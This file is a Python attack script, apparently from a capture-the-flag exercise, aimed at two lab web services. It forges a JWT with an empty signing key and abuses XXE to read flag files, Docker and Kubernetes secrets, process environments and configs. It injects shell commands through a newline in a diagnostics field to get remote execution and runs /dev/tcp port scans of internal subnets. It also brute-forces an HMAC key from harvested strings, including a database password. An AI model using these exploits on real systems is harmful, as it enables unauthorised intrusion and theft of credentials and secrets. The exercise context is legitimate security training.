#!/usr/bin/env python3
"""round30_secret_hunt.py — Hunt for PROBE_SECRET and flag via XXE + network"""
import requests, time, json, hmac as hm, hashlib, base64, socket, struct

CASPI = "http://192.168.242.102:8007"
ECO   = "http://192.168.242.102:8002"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH = {"Authorization": f"Bearer {jwt('operator')}"}

def xxe(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH, "Content-Type":"application/xml"}, timeout=15)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)[:200]

def extract(path, field="remarks"):
    """Read file via XXE and return content or status"""
    code, body = xxe(path, field)
    if code == 200:
        try:
            d = json.loads(body)
            val = d.get("summary",{}).get(field,"")
            return "OK", val
        except:
            return "PARSE_ERR", body[:100]
    elif code == 400:
        return "REJECTED", body[:50]
    else:
        return f"HTTP_{code}", body[:50]

# ============================================================
print("="*70)
print("PHASE 1: FLAG FILE SEARCH")
print("="*70)

flag_paths = [
    "/flag", "/flag.txt", "/root/flag", "/root/flag.txt",
    "/app/flag", "/app/flag.txt", "/home/flag", "/home/flag.txt",
    "/tmp/flag", "/tmp/flag.txt", "/opt/flag", "/opt/flag.txt",
    "/var/flag", "/var/flag.txt", "/etc/flag", "/etc/flag.txt",
    "/app/FLAG", "/FLAG", "/secret", "/secret.txt",
    "/app/secret.txt", "/app/probe_secret", "/app/probe_secret.txt",
    "/app/PROBE_SECRET", "/app/hmac.key", "/app/hmac_key",
    "/app/signing.key", "/app/key.txt", "/app/secret_key",
    "/root/.flag", "/root/.secret",
    "/var/lib/flag", "/var/lib/secret",
    "/run/flag", "/run/secret", "/run/secrets/flag",
    "/run/secrets/probe", "/run/secrets/signing_key",
    "/var/run/secrets/flag", "/var/run/secrets/signing_key",
    "/etc/secret", "/etc/probe_secret",
    "/app/llehs", "/app/LLEHS", "/llehs", "/LLEHS",
    "/flag_llehs", "/app/flag_llehs",
]

for fp in flag_paths:
    status, val = extract(fp)
    if status == "OK" and val:
        print(f"  [FOUND!] {fp}: {val[:200]}")
    elif status == "REJECTED":
        print(f"  [EXISTS/BINARY] {fp}")
    elif status == "OK":
        pass  # empty or doesn't exist
    else:
        print(f"  [{status}] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: EXISTENCE CHECK — DOES EMPTY = NON-EXISTENT?")
print("="*70)

# Test with definitely non-existent file
for testfile in ["/app/xyzzy_nonexistent_12345.py",
                 "/tmp/absolutely_does_not_exist_789.txt",
                 "/nonexistent_path/file.txt"]:
    status, val = extract(testfile)
    print(f"  {testfile}: [{status}] val='{val[:30] if val else ''}'")

# Compare with known empty file
status, val = extract("/app/probe.py")
print(f"  /app/probe.py (from Phase2): [{status}] val='{val[:30] if val else ''}'")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: OPEN FILE DESCRIPTORS")
print("="*70)

for fd in range(20):
    status, val = extract(f"/proc/self/fd/{fd}")
    if status == "OK" and val:
        print(f"  fd/{fd}: {val[:200]}")
    elif status == "REJECTED":
        print(f"  fd/{fd}: [EXISTS/BINARY]")
    # else silently skip

# Also check master process (PID 1) fds
for fd in range(10):
    status, val = extract(f"/proc/1/fd/{fd}")
    if status == "OK" and val:
        print(f"  PID1 fd/{fd}: {val[:200]}")
    elif status == "REJECTED":
        print(f"  PID1 fd/{fd}: [EXISTS/BINARY]")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: /proc/self/environ PARTIAL READ ATTEMPT")
print("="*70)

# Try reading with XML 1.1 (allows more control chars, but NOT null)
xml11 = '''<?xml version="1.1" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///proc/self/environ">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>'''

try:
    r = S.post(f"{CASPI}/api/ops/custody/ingest",
        data=xml11, headers={**AUTH, "Content-Type":"application/xml"}, timeout=15)
    print(f"  XML 1.1 /proc/self/environ: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  XML 1.1 error: {e}")

# Try /proc/self/cmdline
status, val = extract("/proc/self/cmdline")
print(f"  /proc/self/cmdline: [{status}] {val[:200] if val else 'empty'}")

# Try reading /proc/1/cmdline
status, val = extract("/proc/1/cmdline")
print(f"  /proc/1/cmdline: [{status}] {val[:200] if val else 'empty'}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: DOCKER SECRETS & CONFIG PATHS")
print("="*70)

secret_paths = [
    "/run/secrets/", "/var/run/secrets/",
    "/etc/secrets/", "/etc/secret/",
    "/app/secrets/", "/app/secret/",
    "/run/secrets/probe_secret",
    "/run/secrets/hmac_key", "/run/secrets/hmac_secret",
    "/run/secrets/signing_key", "/run/secrets/app_secret",
    "/run/secrets/jwt_secret", "/run/secrets/terminal_secret",
    "/run/secrets/gateway_secret", "/run/secrets/gw_key",
    "/run/secrets/api_key",
    # Kubernetes secrets
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    # Docker env files
    "/etc/environment",
    "/root/.bashrc", "/root/.profile", "/root/.bash_profile",
    "/home/app/.env", "/home/app/.bashrc",
    # Systemd
    "/etc/systemd/system/app.service",
    "/etc/supervisor/conf.d/app.conf",
]

for fp in secret_paths:
    status, val = extract(fp)
    if status == "OK" and val:
        print(f"  [FOUND!] {fp}: {val[:300]}")
    elif status == "REJECTED":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: EXPLORE /register AND /portal PAGES")
print("="*70)

for path in ["/register", "/portal", "/services"]:
    try:
        r = S.get(f"{CASPI}{path}", headers=AUTH, timeout=10)
        print(f"\n  GET {path}: [{r.status_code}] ({len(r.text)} bytes)")
        if r.status_code == 200:
            import re
            # Extract links, scripts, forms
            links = re.findall(r'href=["\']([^"\']+)', r.text)
            scripts_src = re.findall(r'src=["\']([^"\']+)', r.text)
            apis = re.findall(r'["\'](/api/[^"\']+)["\']', r.text)
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)', r.text)
            inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)', r.text)
            print(f"    Links: {links[:10]}")
            print(f"    Scripts: {scripts_src}")
            print(f"    APIs: {apis}")
            print(f"    Forms: {forms}")
            print(f"    Inputs: {inputs}")

            # Find interesting content
            for keyword in ["secret", "key", "token", "flag", "probe", "hmac", "password"]:
                if keyword in r.text.lower():
                    idx = r.text.lower().index(keyword)
                    print(f"    KEYWORD '{keyword}' at pos {idx}: ...{r.text[max(0,idx-30):idx+50]}...")
    except Exception as e:
        print(f"  {path}: error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: DIRECT DB CONNECTION TEST")
print("="*70)

# Check if terminal-db port 5432 is reachable from Kali
print("  Testing PostgreSQL connectivity...")

# Try direct connection to CaspiTerminal host
for host, port in [("192.168.242.102", 5432), ("192.168.242.102", 5433),
                   ("192.168.242.102", 3306), ("192.168.242.102", 6379),
                   ("192.168.242.102", 9100), ("192.168.242.102", 3000)]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, port))
        print(f"  {host}:{port} OPEN!")
        # If it's PG, try to get version
        if port in [5432, 5433]:
            # Send SSLRequest
            s.send(struct.pack('>II', 8, 80877103))
            resp = s.recv(1)
            print(f"    PG SSL response: {resp}")
        s.close()
    except socket.timeout:
        print(f"  {host}:{port} timeout")
    except ConnectionRefusedError:
        print(f"  {host}:{port} refused")
    except Exception as e:
        print(f"  {host}:{port} error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 8: DIRECTORY STRUCTURE ENUMERATION")
print("="*70)

# Reading directories: 200+empty = empty dir, 400 = has files/doesn't exist
dirs = [
    "/app/static/", "/app/static/js/", "/app/static/css/",
    "/app/static/img/", "/app/static/fonts/",
    "/app/templates/", "/app/templates/ops/",
    "/app/templates/auth/", "/app/templates/admin/",
    "/app/config/", "/app/conf/",
    "/app/lib/", "/app/modules/",
    "/app/data/", "/app/migrations/",
]

for d in dirs:
    status, val = extract(d)
    if status == "OK" and val:
        print(f"  {d}: [HAS CONTENT] {val[:100]}")
    elif status == "REJECTED":
        print(f"  {d}: [HAS FILES]")
    elif status == "OK":
        print(f"  {d}: [EMPTY DIR]")

# ============================================================
print("\n"+"="*70)
print("PHASE 9: READ FULL /ops/custody PAGE (JS)")
print("="*70)

# The custody page had truncated JS - get the full script
r = S.get(f"{CASPI}/ops/custody", headers=AUTH, timeout=10)
if r.status_code == 200:
    import re
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
    for i, script in enumerate(scripts):
        if script.strip() and len(script.strip()) > 20:
            print(f"  Script {i} ({len(script)} chars):")
            print(script)

# ============================================================
print("\n"+"="*70)
print("PHASE 10: EcoCycle RCE — SCAN CaspiTerminal NETWORK")
print("="*70)

# Use EcoCycle RCE to try to reach terminal-db or discover CaspiTerminal internal IPs
SE = requests.Session()

def eco_rce(cmd):
    safe = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._:/=")
    enc = ""
    for c in cmd:
        enc += c if c in safe else f"%{ord(c):02x}"
    target = f"127.0.0.1%0a{enc}"
    try:
        r = SE.post(f"{ECO}/api/ops/diag/run",
            json={"device":"WE-1","probe":"pk_we1_e5a2b4d6f809","target":target}, timeout=30)
        d = r.json()
        out = d.get("output","")
        lines = [l for l in out.split("\n") if l.strip() and "localhost" not in l]
        return "\n".join(lines), d.get("error","")
    except Exception as e:
        return "", str(e)[:100]

# Check if EcoCycle can reach CaspiTerminal network
# First, get EcoCycle's network info
print("  EcoCycle network interfaces:")
out, err = eco_rce("ip addr show")
if not out:
    out, err = eco_rce("ifconfig")
print(f"  {out[:500]}")

# Try to resolve terminal-db
print("\n  DNS lookups:")
for host in ["terminal-db", "gauge-gw.internal", "gauge-gw"]:
    out, err = eco_rce(f"getent hosts {host}")
    print(f"  {host}: {out or 'not found'}")

# Try scanning common subnets for PG port
print("\n  Port scanning for PostgreSQL (5432):")
# CaspiTerminal is at 192.168.242.102 externally.
# Try internal Docker IPs
for ip_base in ["172.19.0", "172.20.0", "172.21.0", "172.22.0"]:
    for last in range(1, 8):
        ip = f"{ip_base}.{last}"
        out, err = eco_rce(f"timeout 2 bash -c 'echo>/dev/tcp/{ip}/5432' 2>&1")
        if "refused" not in out.lower() and "timed out" not in out.lower() and err == "":
            print(f"  {ip}:5432 - possible OPEN: {out[:50]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 11: CANDIDATE KEY TESTING")
print("="*70)

known_url = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# Try keys derived from info we found
candidate_keys = [
    # Hostname
    b"5407f6317f5c",
    # Database password
    b"terminal_web_pw",
    b"terminal_web",
    # Container IDs and paths
    b"APT-AKTAU-01",
    b"041240001357",
    # Common patterns from CTF
    b"caspiterminal",
    b"CaspiTerminal",
    b"gauge-gw",
    b"gauge-gw.internal",
    b"probe_secret",
    b"PROBE_SECRET",
    b"terminal_secret",
    b"signing_secret",
    b"hmac_secret",
    # Combinations
    b"terminal_web_pw@terminal-db:5432/terminal",
    b"CaspiTerminal2026",
    b"aktau2026",
    b"KHS",
    b"khs",
    # Full DB URL
    b"postgresql://terminal_web:terminal_web_pw@terminal-db:5432/terminal",
    # Gunicorn port
    b"3000",
    b"8007",
    # BIN number
    b"041240001357",
    # Other
    b"ops@caspiterminal.kz",
    b"caspiterminal.kz",
    b"mangystau",
    b"aktau",
    b"Aktau",
    b"AKTAU",
    # Known probe secrets from EcoCycle
    b"pk_we1_e5a2b4d6f809",
    b"pk_a3_7f21c9d4e0b6",
    # UUID-like
    b"5407f6317f5c",
]

for key in candidate_keys:
    sig = hm.new(key, known_url.encode(), hashlib.sha256).hexdigest()
    if sig == known_sig:
        print(f"  FOUND KEY: {key.decode()} <<<<<<")
        break
else:
    print("  No candidate key matched")

# Try hex-decoded hostname as key
hostname = "5407f6317f5c"
try:
    key = bytes.fromhex(hostname)
    sig = hm.new(key, known_url.encode(), hashlib.sha256).hexdigest()
    if sig == known_sig:
        print(f"  FOUND KEY: hex({hostname}) <<<<<<")
except:
    pass

# ============================================================
print("\n"+"="*70)
print("PHASE 12: ENUMERATE MORE /app/ FILES")
print("="*70)

# Try to find files that might contain the secret without < or &
more_files = [
    "/app/key", "/app/key.pem", "/app/.key",
    "/app/probe.key", "/app/probe.secret",
    "/app/hmac.key", "/app/.hmac_key",
    "/app/signing_key", "/app/.signing_key",
    "/app/secret_key.txt", "/app/probe_key.txt",
    "/app/env.py", "/app/environ.py",
    "/app/conf.py", "/app/params.py",
    "/app/vars.py", "/app/jwt_secret",
    "/app/.secret_key", "/app/master.key",
    "/app/credentials", "/app/.credentials",
    # Python package metadata
    "/app/setup.py", "/app/setup.cfg", "/app/pyproject.toml",
    # Uwsgi/nginx config
    "/etc/nginx/nginx.conf", "/etc/nginx/conf.d/default.conf",
    "/etc/nginx/sites-enabled/default",
    # Supervisor
    "/etc/supervisor/conf.d/app.conf",
    "/etc/supervisord.conf",
]

for fp in more_files:
    status, val = extract(fp)
    if status == "OK" and val:
        print(f"  [FOUND!] {fp}: {val[:300]}")
    elif status == "REJECTED":
        print(f"  [EXISTS/BINARY] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 13: NGINX CONFIG (MIGHT SHOW UPSTREAM/SECRETS)")
print("="*70)

nginx_files = [
    "/etc/nginx/nginx.conf",
    "/etc/nginx/conf.d/default.conf",
    "/etc/nginx/conf.d/app.conf",
    "/etc/nginx/sites-enabled/default",
]
for fp in nginx_files:
    status, val = extract(fp)
    if status == "OK" and val:
        print(f"\n  === {fp} ===")
        print(val)

print("\n"+"="*70)
print("DONE")
print("="*70)
